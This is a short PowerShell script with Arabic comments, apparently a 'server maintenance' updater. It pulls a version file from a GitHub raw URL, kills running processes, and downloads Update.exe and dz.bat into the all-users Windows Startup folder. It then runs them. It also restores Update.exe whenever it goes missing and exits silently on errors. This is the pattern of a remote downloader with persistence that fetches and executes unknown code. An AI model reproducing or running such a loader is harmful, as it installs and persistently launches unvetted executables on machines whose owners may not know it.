$repo    = "https://raw.githubusercontent.com/zizomail1015-collab/server-maintenance/main"
$work    = "C:\ServerMaintenance"
$dest    = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$files   = @("Update.exe", "dz.bat")

if (-not (Test-Path $work)) { New-Item -ItemType Directory -Path $work | Out-Null }
$verFile = Join-Path $work "version.local"

try {
    $remote = (Invoke-WebRequest -Uri "$repo/version.txt" -UseBasicParsing).Content.Trim()
} catch {
    exit
}

$local = ""
if (Test-Path $verFile) { $local = (Get-Content $verFile -Raw).Trim() }

# --- تحديد نوع الدورة ---
# تحديث حقيقي: رقم الإصدار تغيّر  ->  ينزل الملفان ويشتغلان (dz.bat ضمنهما)
# استرجاع فقط: الرقم نفسه لكن ملف ناقص  ->  يرجع Update.exe وحده ويُشغّل، ولا يُلمس dz.bat
$isUpdate = ($remote -ne $local)

$missing = $false
foreach ($f in $files) { if (-not (Test-Path (Join-Path $dest $f))) { $missing = $true } }

# لا عمل: الرقم نفسه وكل الملفات موجودة
if (-not $isUpdate -and -not $missing) { exit }

# الملفات التي ستُعالَج هذه الدورة
if ($isUpdate) {
    # تحديث حقيقي: الملفان معًا
    $targets = $files
} else {
    # استرجاع فقط: Update.exe إن كان ناقصًا، دون dz.bat إطلاقًا
    $targets = @()
    if (-not (Test-Path (Join-Path $dest "Update.exe"))) { $targets += "Update.exe" }
    if ($targets.Count -eq 0) { exit }
}

# إيقاف أي نسخة شغّالة من الملفات المستهدفة فقط
foreach ($f in $targets) {
    $name = [IO.Path]::GetFileNameWithoutExtension($f)
    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# تنزيل الملفات المستهدفة فقط
foreach ($f in $targets) {
    try {
        Invoke-WebRequest -Uri "$repo/$f" -OutFile (Join-Path $dest $f) -UseBasicParsing
    } catch {
        exit
    }
}

# تحديث رقم الإصدار المحلي فقط عند التحديث الحقيقي
if ($isUpdate) {
    Set-Content -Path $verFile -Value $remote
}

# تشغيل الملفات المستهدفة فقط
foreach ($f in $targets) {
    Start-Process -FilePath (Join-Path $dest $f) -WorkingDirectory $dest
}
